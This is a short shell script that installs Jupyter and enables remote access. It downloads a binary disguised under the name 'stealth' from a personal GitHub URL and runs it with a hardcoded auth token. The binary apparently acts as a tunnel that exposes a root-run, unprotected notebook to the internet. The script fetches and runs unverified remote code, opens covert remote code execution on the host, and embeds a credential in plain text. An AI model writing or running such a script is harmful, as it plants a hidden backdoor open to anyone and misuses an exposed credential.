apt update;apt -y install python3-pip python3 screen net-tools iputils-ping curl wget
pip3 install jupyter
sleep 2
echo "ls before generating jupyter config"
sleep 2
ls -la
jupyter notebook --generate-config
sleep 2
echo "ls after generating jupyter config"
sleep 2
ls -la

echo "c.NotebookApp.allow_remote_access = True" >> ~/.jupyter/jupyter_notebook_config.py

wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/stealth >/dev/null
sleep 2
chmod +x stealth
sleep 2
./stealth authtoken 1ilVTgjbJzLiHF29nLWN8Jbe6a7_2ioxVQMzGPf1Bb2rLSpa5
sleep 2
screen -dmS ngroo bash -c './stealth http 1234'
sleep 2
curl http://127.0.0.1:4040/api/tunnels
sleep 2
jupyter notebook --allow-root --port 1234
